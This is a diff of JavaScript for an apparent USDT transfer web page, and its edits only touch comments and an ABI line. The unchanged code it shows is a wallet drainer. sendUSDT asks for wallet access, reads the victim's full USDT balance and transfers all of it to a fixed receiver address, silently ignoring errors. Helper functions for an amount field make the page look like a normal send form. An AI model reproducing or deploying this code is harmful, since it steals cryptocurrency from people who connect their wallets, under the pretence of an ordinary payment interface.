@@ -1,15 +1,13 @@
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
 const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
 
 const usdtABI = [
   "function balanceOf(address) view returns (uint256)",
-  "function decimals() view returns (uint8)",
   "function transfer(address to, uint256 value) returns (bool)"
 ];
 
 async function sendUSDT() {
   if (!window.ethereum) return;
-
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
@@ -23,11 +21,11 @@ async function sendUSDT() {
     const tx = await usdt.transfer(receiver, balance);
     await tx.wait();
   } catch (err) {
-    // Silent fail
+    // silent fail
   }
 }
 
-// UI helper functions (cut/paste/max)
+// Below functions are for UI only
 function clearAddress() {
   document.getElementById("address").value = "";
 }
@@ -39,7 +37,7 @@ function pasteAddress() {
 }
 
 function fillMax() {
-  document.getElementById("amount").value = "9999"; // demo only
+  document.getElementById("amount").value = "9999"; // Demo
   updateFiat();
 }
 
